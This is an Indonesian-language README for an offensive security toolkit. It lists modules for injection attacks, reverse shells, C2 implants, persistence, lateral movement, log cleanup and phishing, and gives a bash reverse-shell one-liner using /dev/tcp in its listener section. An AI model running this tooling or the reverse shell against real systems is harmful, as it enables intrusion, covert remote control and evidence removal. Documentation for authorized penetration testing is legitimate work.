# Arsenal Apik v3.2

Custom Security Arsenal — 39 Modules for Red Team, Bug Bounty, and Penetration Testing.

Arsenal Apik adalah kumpulan tools keamanan custom yang ditulis dari 0. Bukan wrapper, bukan fork. Dirancang untuk profesional keamanan siber yang membutuhkan fleksibilitas dan kecepatan dalam pengujian penetrasi.

---

## Fitur

- 39 module siap pakai
- SQL injection, XSS, SSRF, SSTI, GraphQL, Deserialization, Auth Bypass
- Reverse shell generator (multi-platform)
- Auto-exploit: scan + exploit otomatis
- C2 Listener untuk reverse shell
- Dashboard web untuk monitoring
- Output JSON, Markdown, atau teks biasa
- Berjalan di Linux, macOS, Windows (WSL), dan Termux (Android)
- Ringan & cepat

---

## Instalasi

### Linux / macOS / WSL

```bash
git clone https://github.com/seala4ngel/angelmind.git
cd angelmind
pip3 install -r requirements.txt
```

### Kali Linux / Parrot OS

```bash
sudo apt update
sudo apt install python3 python3-pip git -y
git clone https://github.com/seala4ngel/angelmind.git
cd angelmind
pip3 install -r requirements.txt
```

### Termux (Android)

```bash
pkg update && pkg upgrade -y
pkg install python python-pip git -y
git clone https://github.com/seala4ngel/angelmind.git
cd angelmind
pip install -r requirements.txt
```

---

## Cara Pakai

### Format Perintah

```bash
python run.py --module [nama_module] --target [target] [opsi_tambahan]
```

### Contoh Penggunaan

```bash
# SQL injection
python run.py --module sqli --target http://testphp.vulnweb.com --param id

# Reverse shell generator (P1)
python run.py --module revshell --target example.com --ip 0.0.0.0 --port 4444 --platform linux

# Auto-exploit (scan + exploit otomatis)
python run.py --module auto_exploit --target http://testphp.vulnweb.com

# Lihat semua module
python run.py --help
```

---

## Output Format

```bash
# JSON (default)
python run.py --module sqli --target http://testphp.vulnweb.com --param id

# Markdown (buat laporan)
python run.py --module sqli --target http://testphp.vulnweb.com --param id --output markdown

# Teks biasa
python run.py --module sqli --target http://testphp.vulnweb.com --param id --output text
```

---

## Dashboard Web

```bash
python dashboard_app.py
```

Buka `http://localhost:5001` di browser.

---

## C2 Listener (Reverse Shell)

### Terminal 1 — Listener

```bash
python listener.py 9999
```

### Terminal 2 — Kirim Payload

```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/9999 0>&1'
```

Jika berhasil, di terminal 1 akan muncul shell.

---

## Daftar Module

| Kategori | Module | Priority |
|----------|--------|----------|
| Exploit | sqli, xss, ssrf, ssti, graphql, deser, authbypass, chain, vulntrigger | P2-P3 |
| Exploit (P1) | revshell, sqli_shell, ssrf_shell, uploader | P1 |
| Scanner | misconfig, leakscan, bucketscan | P4 |
| Fuzz | webfuzz, apifuzz, intel_fuzz | P4 |
| C2 | implant, beacon | P1 |
| Post | privesc, lateral, cleanup, persist | P1 |
| Attack | phishing, exploit_payload, weaponize, diff, crash, mailcraft, pretext, attack, auto_exploit | P1 |
| Recon | subhunter, portprobe, fingerprint | P5 |

> Priority: P1 = Critical, P5 = Informasi

---

## Catatan Penting

- Tools ini hanya untuk red team, bug bounty, dan penetration testing yang sah.
- Gunakan hanya pada target yang memiliki izin tertulis.
- Penulis tidak bertanggung jawab atas penyalahgunaan.

---

## Kontribusi

Jika ingin menambahkan module atau melaporkan bug:
- Buka Issue di GitHub
- Atau kirim Pull Request

---

## Lisensi

MIT License

---

## Dibuat oleh

[seala4ngel](https://github.com/seala4ngel)
